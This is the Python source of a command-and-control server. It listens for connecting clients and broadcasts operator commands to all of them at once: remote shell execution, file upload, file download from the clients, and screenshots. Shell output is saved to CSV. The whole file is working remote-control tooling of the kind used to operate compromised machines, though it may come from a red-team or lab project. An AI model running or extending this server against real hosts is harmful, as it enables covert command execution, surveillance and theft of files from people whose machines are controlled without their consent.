"""
This module is the main module for C2 server.
"""
import atexit
import mimetypes
import os
from argparse import ArgumentParser
from concurrent.futures.thread import ThreadPoolExecutor
from datetime import datetime
from logging import Formatter, DEBUG, StreamHandler, getLogger
from os.path import exists
from select import select
from shlex import split, quote
from socket import socket, MSG_PEEK
from threading import Thread
from base64 import decodebytes

import magic
import pandas
import rich
from rich.progress import track
from rich.table import Table

import utils
from utils import C2Socket, Commands

FILENAME_LOG = open("server.log", "w")
DOWNLOAD_DIRECTORY = "./download"
DEFAULT_INTERFACE = '0.0.0.0'
DEFAULT_PORT = 9999
CLIENTS = dict()  # type: dict[tuple[str,int],Client]
LOGGER_SERVER_FORMAT = '%(pathname)s:%(lineno)s %(asctime)s %(name)s:%(levelname)s %(message)s'
LOGGER_UTILS_FORMAT = '%(pathname)s:%(lineno)s %(asctime)s %(name)s:%(levelname)s %(ip)s:%(port)s %(message)s'

LOGGER = getLogger('server')
LOGGER.setLevel(DEBUG)

HANDLER = StreamHandler(FILENAME_LOG)
HANDLER.setLevel(DEBUG)
HANDLER.setFormatter(Formatter(LOGGER_SERVER_FORMAT, '%H:%M:%S'))
LOGGER.addHandler(HANDLER)

UTILS_HANDLER = StreamHandler(FILENAME_LOG)
UTILS_HANDLER.setLevel(DEBUG)
UTILS_HANDLER.setFormatter(Formatter(LOGGER_UTILS_FORMAT, '%H:%M:%S'))
utils.LOGGER.addHandler(UTILS_HANDLER)

LOGGER.debug("Started")


def sizeof_fmt(num, suffix='B'):
    """ Human readable file size

    Notes :
        Credit goes to  https://stackoverflow.com/questions/1094841/get-human-readable-version-of-file-size
    """
    for unit in ['', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi']:
        if abs(num) < 1024.0:
            return "%3.1f%s%s" % (num, unit, suffix)
        num /= 1024.0
    return "%.1f%s%s" % (num, 'Yi', suffix)


class Client(C2Socket):
    """ Extended class of C2Socket representing a single C2 client """

    def send_command(self, command: str, args=''):
        """ Send command to client """
        full_command = (command + ' ' + args).encode()
        self.send_packet(full_command)


class CommandLauncher:
    """ Class used to parse, and start commands entered in terminal """

    def __init__(self, u_input):
        self.command_id = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        self.input = u_input
        self.cmd = None
        self.cmd_args = None
        self.shared = list()
        self._path = f'{DOWNLOAD_DIRECTORY}/{self.command_id}'
        self.is_path_created = False

    def is_valid(self):
        """ Check if input is valid

        Returns (bool): True if it is valid, else False
        """
        try:
            self.cmd, *self.cmd_args = split(self.input)
            return True
        except ValueError as err:
            rich.print(f"[b red]{err}")
            LOGGER.debug("command %s invalid : %s", self.input, err)
        return False

    @property
    def path(self):
        """ Returns download path for this specific command """
        if not self.is_path_created:
            os.makedirs(self._path, exist_ok=True)
            self.is_path_created = True
        return self._path

    def setup(self):
        """ Execute setup actions associated with command.

        If returns False, the command is cancelled.
        To use it, process like teardown actions
        """
        name = 'setup_%s' % self.cmd
        if hasattr(self, name):
            LOGGER.debug("Starting setup : %s", name)
            return getattr(self, name)()
        LOGGER.debug("No setup named : %s", name)
        return True

    def teardown(self):
        """ Execute teardown actions associated with command

        To set a teardown action for a command, just create method "teardown_commandname".
        This function will be called after the clients communication.

        """
        name = 'teardown_%s' % self.cmd
        if hasattr(self, name):
            LOGGER.debug("Starting teardown : %s", name)
            getattr(self, name)()
        else:
            LOGGER.debug("No teardown named : %s", name)

    def start(self):
        """ Execute command

        This includes :
            - Cleaning clients list
            - Executing each command asynchronously on all clients
            - Executing teardown function

        """
        clients_cleaner()
        if not self.setup():
            return
        commands = [ServerCommands(self, client) for client in CLIENTS.values()]

        if sum([1 if c.is_valid() else 0 for c in commands]) != len(commands):
            rich.print("[b red]Command not valid")
            return

        if ARGS.threads > 0:
            with ThreadPoolExecutor(ARGS.threads) as ex:
                list(track(ex.map(lambda x: x.execute(), commands), transient=True, total=len(commands)))
        else:
            for command in track(commands, transient=True):
                command.execute()

        self.teardown()

    def setup_upload(self):
        """ Check that provided file exists """
        if self.cmd_args:
            if not exists(self.cmd_args[0]):
                rich.print("[b red]File does not exists")
                return False
            rich.print("[green]File size : %s" % sizeof_fmt(os.stat(self.cmd_args[0]).st_size))
        return True

    def teardown_sh(self):
        """ Save all stdin/stderr of clients to CSV """
        dataframe = pandas.DataFrame \
            .from_records(self.shared, columns=['host', 'output']) \
            .sort_values(by="host")
        dataframe.to_csv(f'{self.path}/output.csv')

        def summary(out: str):
            """ Summarize stdout/err for printing screen """
            lines = [line if len(line) < 80 else line[:80] + ' ...' for line in out.split('\n')]
            return out if len(lines) <= 3 else lines[0] + f' (missing {len(lines) - 1} lines)'

        dataframe['display'] = dataframe['output'].map(summary)

        table = Table(show_header=True, header_style="bold blue", show_lines=True)
        table.add_column("Host")
        table.add_column("Output")
        for host, output in zip(dataframe['host'], dataframe['display']):
            table.add_row(f"[blue]{host}", output)
        rich.print(table)

        rich.print(f"[green]Output saved to {self.path}/output.csv")

    def teardown_exit(self):
        """ Teardown at exit """
        LOGGER.debug("Server exit")
        for client in CLIENTS:
            LOGGER.debug("%s closed", client)
            client.__exit__()
        SERVER_THREAD.socket.close()


class ServerCommands(Commands):
    """ Extending Commands class to add server commands
    """

    def __init__(self, launcher: CommandLauncher, sock: Client):
        super().__init__(sock, launcher.cmd, launcher.cmd_args, launcher.input)
        self.sock = sock
        self.launcher = launcher

    @staticmethod
    def help():
        """ Print help for implemented commands """
        functions = list(filter(lambda i: i[0].startswith('command_') and type(i[1]).__name__ == 'function',
                                ServerCommands.__dict__.items()))
        functions.append(('help, h', 'Show this help'))
        functions.append(('! ...', 'Alias for sh'))
        functions.append(('clear', 'Clear screen'))
        functions.append(('list, l', ServerCommands.list))

        table = Table(show_header=True, header_style="bold blue", show_lines=True)
        table.add_column("Command")
        table.add_column("Description")
        for name, fct in sorted(functions, key=lambda f: f[0]):
            table.add_row(name.replace('command_', ''), (fct if isinstance(fct, str) else fct.__doc__).strip())
        rich.print(table)

    @staticmethod
    def list():
        """ Print table of actual clients """
        table = Table(show_header=True, header_style="bold blue")
        table.add_column("N°")
        table.add_column("IP")
        table.add_column("Port")
        for i, (ip_addr, port) in enumerate(CLIENTS):
            table.add_row(str(i + 1), ip_addr, str(port))
        rich.print(table)

    def command_upload(self, local_fn: str, dist_fn: str):
        """ Upload local file on remote client

        Args:
            local_fn (str): Local filename
            dist_fn (str): Filename on clients
        """
        self.sock.send_command('upload', quote(dist_fn))
        with open(local_fn, 'rb') as file:
            self.sock.send_file(file)

    def command_download(self, filename: str):
        """ Download client file

        Args:
            filename (str): Download file from remote client to local
        """
        self.sock.send_command('download', quote(filename))
        filename = f"{self.launcher.path}/download_{self.sock.ip_address}_{self.sock.port}"
        with open(filename, 'wb') as file:
            self.sock.read_into_file(file)
        try:
            ext = mimetypes.guess_extension(magic.Magic(mime=True).from_file(filename))
            if ext:
                os.rename(filename, filename + ext)
        except OSError as err:
            rich.print("[b red]Cannot guess mime type : ", err)

    def command_screenshot(self):
        """ Take a screenshot of client """
        self.sock.send_command("screenshot")

        filename = f'screenshot_{self.sock.ip_address}_{self.sock.port}.png'
        with open(f'{self.launcher.path}/{filename}', 'wb') as file:
            self.sock.read_into_file(file)

    def command_exit(self):
        """ Clean disconnect client """
        self.sock.send_command("exit")

        # read empty data to remove TIME_WAIT
        try:
            self.sock.sock.recv(256)
        except OSError:
            pass

    def command_sh(self, *cmd):
        """ Execute shell command on client and receive output
        Args:
            *cmd: Shell command
        """
        self.sock.send_command("sh", self.input)
        out = self.sock.read_packet().strip()
        try:
            out = out.decode()
        except ValueError:
            pass
        self.launcher.shared.append(("%s:%s" % (self.sock.ip_address, self.sock.port), out))


def clients_cleaner():
    """ Remove disconnected clients from global dictionnary.

    Using non-blocking select on clients sockets, we find all ready-to-read clients.
    Then, we try to read bytes from socket (using MSG_PEEK then not removing data from recv queue).
    If empty, it means the client is disconnected.

    """
    index = {cli.sock: cli for cli in CLIENTS.values()}  # type: dict[socket, Client]
    read_ready, *_ = select(index.keys(), [], [], 0)
    for sock_cli in read_ready:  # type: socket
        try:
            if not sock_cli.recv(32, MSG_PEEK):
                raise Exception()
        except:
            remote_cli = index.get(sock_cli).ip_address, index.get(sock_cli).port
            LOGGER.debug("Client %s:%s disconnected", *remote_cli)
            CLIENTS.pop(remote_cli)


class ServerThread(Thread):
    """ Representing server main thread. """

    def __init__(self, address):
        super().__init__(name='ServerThread', daemon=True)

        self.socket = socket()
        self.socket.bind(address)
        self.socket.listen(10)

    def run(self):
        rich.print("[green]Server listen on interface %s port %s" % self.socket.getsockname())
        while True:
            client_sock, client_addr = self.socket.accept()
            rich.print(f'[green]Client {client_addr} connected')
            LOGGER.debug(f'Client %s connected', client_addr)

            CLIENTS[client_addr] = Client(*client_addr, client_sock)


def clean_exit():
    """ Exit handler """
    rich.print("Bye")
    launcher = CommandLauncher('exit')
    if launcher.is_valid():
        launcher.start()
    else:
        rich.print("Invalid")


if __name__ == '__main__':
    PARSER = ArgumentParser()
    PARSER.add_argument('-i', '--interface', default=DEFAULT_INTERFACE, help='Listening interface')
    PARSER.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help='Listening port')
    PARSER.add_argument('-t', '--threads', type=int, default=os.cpu_count(), help='Number of threads. '
                                                                                  'If 0, do not use threads.')
    ARGS = PARSER.parse_args()

    rich.print(decodebytes(b'W2JsdWUzXQpbcmVkXSAgIF9fX19fXyAgIF9fX1svXSAgICAgICAgICAgX19fX18KW3JlZF0gIC8g\nX19fXy8gIHxfXyBcWy9dICAgICAgICAgLyBfX18vICBfX18gICAgX19fX18gXyAgIF9fICBfX18g\nICAgX19fX18KW3JlZF0gLyAvICAgICAgIF9fLyAvWy9dICAgICAgICAgXF9fIFwgIC8gXyBcICAv\nIF9fXy98IHwgLyAvIC8gXyBcICAvIF9fXy8KW3JlZF0vIC9fX18gICAgLyBfXy9bL10gICAgICAg\nICBfX18vIC8gLyAgX18vIC8gLyAgICB8IHwvIC8gLyAgX18vIC8gLwpbcmVkXVxfX19fLyAgIC9f\nX19fL1svXSAgICAgICAgL19fX18vICBcX19fLyAvXy8gICAgIHxfX18vICBcX19fLyAvXy8KCg==\n').decode())

    try:
        SERVER_THREAD = ServerThread((ARGS.interface, ARGS.port))
        SERVER_THREAD.start()
        atexit.register(clean_exit)
        while True:
            USER_INPUT = input(">> ").strip()
            if USER_INPUT:
                if USER_INPUT in ["quit", "exit", "bye"]:
                    break
                if USER_INPUT in ["clear"]:
                    os.system('clear')
                elif USER_INPUT in ["help", "h"]:
                    ServerCommands.help()
                elif USER_INPUT in ["list", "l"]:
                    ServerCommands.list()
                else:
                    if USER_INPUT.startswith('!'):
                        USER_INPUT = 'sh ' + USER_INPUT[1:]
                    LAUNCHER = CommandLauncher(USER_INPUT)
                    if not LAUNCHER.is_valid():
                        rich.print("[b red]Bad syntax")
                    LAUNCHER.start()
    except KeyboardInterrupt:
        pass
